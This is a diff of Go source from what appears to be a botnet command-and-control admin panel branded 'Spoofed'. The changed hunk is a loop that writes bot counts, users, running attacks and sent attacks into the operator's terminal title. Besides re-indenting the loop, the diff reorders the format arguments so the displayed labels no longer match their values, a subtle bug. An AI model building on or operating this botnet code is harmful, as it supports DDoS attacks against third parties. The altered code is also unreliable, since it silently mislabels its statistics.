@@ -101,35 +101,36 @@ func (this *Admin) Handle() {
 		"\033[1;95m          ╚═══════════════════════════════════╝\033[0m\r\n\r\n"
 
 	this.conn.Write([]byte(banner))
-	go func() {
-		i := 0
-		for {
-			var BotCount int
-			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
-				BotCount = userInfo.maxBots
-			} else {
-				BotCount = clientList.Count()
-			}
+    go func() {
+        i := 0
+        for {
+            var BotCount int
+            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
+                BotCount = userInfo.maxBots
+            } else {
+                BotCount = clientList.Count()
+            }
 
-			time.Sleep(time.Second)
-			if userInfo.admin == 1 {
-				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Spoofed ✨ :: %d bots :: %d users :: %d running atk :: %d sents\007", BotCount, database.fetchUsers(), database.fetchRunningAttacks(), database.fetchAttacks()))); err != nil {
-					this.conn.Close()
-					break
-				}
-			}
-			if userInfo.admin == 0 {
-				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Spoofed :: %d bots :: %d running atk\007", BotCount, database.fetchRunningAttacks()))); err != nil {
-					this.conn.Close()
-					break
-				}
-			}
-			i++
-			if i%60 == 0 {
-				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
-			}
-		}
-	}()
+            time.Sleep(time.Second)
+            if userInfo.admin == 1 {
+                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Spoofed ✨ :: %d bots :: %d users :: %d running atk :: %d sents\007", BotCount, database.fetchRunningAttacks(), database.fetchAttacks(), database.fetchUsers()))); err != nil {
+                    this.conn.Close()
+                    break
+                }
+            }
+            if userInfo.admin == 0 {
+                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Spoofed :: %d bots :: %d running atk\007", BotCount, database.fetchRunningAttacks()))); err != nil {
+                    this.conn.Close()
+                    break
+                }
+            }
+            i++
+            if i % 60 == 0 {
+                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
+            }
+        }
+    }()
+
 	for {
 		var botCatagory string
 		var botCount int
